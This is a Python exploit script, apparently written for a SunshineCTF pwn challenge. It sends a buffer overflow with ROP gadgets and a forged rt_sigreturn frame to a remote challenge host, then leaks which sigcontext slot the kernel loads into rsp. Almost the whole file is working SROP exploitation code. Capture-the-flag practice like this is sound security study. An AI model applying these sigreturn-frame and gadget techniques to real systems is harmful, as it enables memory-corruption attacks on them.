#!/usr/bin/env python3
"""Read the restored RSP straight back out of the kernel.

Buffer placement is now proven: walking with 0x401032 leaks any slot of the payload
exactly as written.  So the only remaining unknown is which frame slot rt_sigreturn
loads into rsp.

Make sigreturn jump to 0x401000, the program's own start.  The restarted process
runs f1, whose `push rsp` stores the *decremented* rsp at that same address and then
writes those 8 bytes out, so the reply is restored_rsp - 16 - 8 = a direct readout of
the rsp the kernel actually installed.  Every frame slot except the rip slot holds a
unique sentinel buf+0x8000+8*j, so the number that comes back names the slot.
"""
import socket
import struct
import time

HOST = "chal.sunshinectf.games"
PORT = 26003
G1, SC = 0x401032, 0x401069
RESTART = 0x401000
FRAME_AT, B, FRAME_LEN = 0x90, 0x28, 0x28 + 0xC0
RIP_SLOT = B + 0x80          # proven: this one is honoured
SENT = 0x300     # sentinels stay inside the 1024-byte buffer, so they are mapped


def recvn(s, n, t=4.0):
    s.settimeout(t)
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except socket.timeout:
            break
        if not c:
            break
        b += c
    return b


def drain(s, t=2.0):
    s.settimeout(t)
    b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


s = socket.create_connection((HOST, PORT), timeout=20)
try:
    L = struct.unpack("<Q", recvn(s, 8))[0]
    buf = L - 0x78
    f = bytearray(FRAME_LEN)
    for j in range(0, FRAME_LEN, 8):
        struct.pack_into("<Q", f, j, buf + SENT + j)
    struct.pack_into("<Q", f, RIP_SLOT, RESTART)
    struct.pack_into("<Q", f, B + 0x88, 0x246)            # eflags
    struct.pack_into("<Q", f, B + 0x90, 0x33 | (0x2B << 48))
    struct.pack_into("<Q", f, B + 0xB0, 0)                # fpstate
    body = bytearray(b"\x90" * (FRAME_AT + FRAME_LEN))
    struct.pack_into("<Q", body, 0x80, G1)
    struct.pack_into("<Q", body, 0x88, SC)
    body[FRAME_AT:FRAME_AT + FRAME_LEN] = f
    print("[+] buf=%#x frame=%#x, sentinels at buf+%#x.." % (buf, buf + FRAME_AT, SENT))
    s.sendall(b"\x90" * 24 + bytes(body))
    time.sleep(0.5)
    pre = drain(s, 0.3)
    s.sendall(b"Z" * 15)
    time.sleep(0.6)
    got = pre + drain(s, 3.0)
    print("[*] n=%d raw=%s" % (len(got), got[:24].hex()))
    if len(got) >= 8:
        v = struct.unpack("<Q", got[:8])[0]
        print("[*] leaked %#x ; buf=%#x ; delta from buf = %#x" % (v, buf, v - buf))
        if v >= buf + SENT - 0x100:
            j = v - (buf + SENT) + 24          # restored_rsp = sentinel - 16 - 8? solve below
            # restored_rsp - 16 = v  =>  restored_rsp = v + 16
            # sentinel at slot j is buf+SENT+j  =>  j = v + 16 - buf - SENT
            jj = v + 16 - buf - SENT
            print("[!] restored rsp = %#x -> frame slot offset 0x%x (mcontext base 0x%x)"
                  % (v + 16, jj, jj - 0x78 if 0 <= jj < FRAME_LEN else -1))
            if 0 <= jj < FRAME_LEN:
                print("[!] that is %s sigcontext" % (
                    "exactly" if jj == B + 0x78 else "not"))
        else:
            print("[!] not a sentinel - the kernel kept its own rsp, or rip was wrong")
finally:
    s.close()
